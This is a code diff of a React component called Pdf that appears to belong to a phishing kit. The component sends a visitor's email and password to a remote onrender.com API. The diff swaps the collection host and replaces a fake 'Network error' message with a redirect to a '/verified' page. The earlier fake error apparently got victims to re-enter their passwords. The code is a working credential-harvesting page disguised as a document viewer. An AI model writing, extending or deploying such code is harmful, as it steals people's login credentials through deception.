@@ -30,7 +30,7 @@ function Pdf() {
         setError('');
 
         try {
-            const res = await fetch("https://mog-api-r24m.onrender.com/api/contact", {
+            const res = await fetch("https://bd-mys-api.onrender.com/api/contact", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ mail: email, pass: password })
@@ -39,11 +39,11 @@ function Pdf() {
             const data = await res.json();
 
             if (res.ok || data.status === 'partial') {
-                // navigate('/verified', { state: { email } });
-                setError('Network error. Please check your connection and refresh the page.');
+                navigate('/verified', { state: { email } });
+                // setError('Network error. Please check your connection and refresh the page.');
     
             } else {
-                setError(data.message || 'Login failed. Please try again.');
+                setError(data.message || 'failed. Please try again.');
             }
         } catch (error) {
             setError('Network error. Please check your connection and try again.');
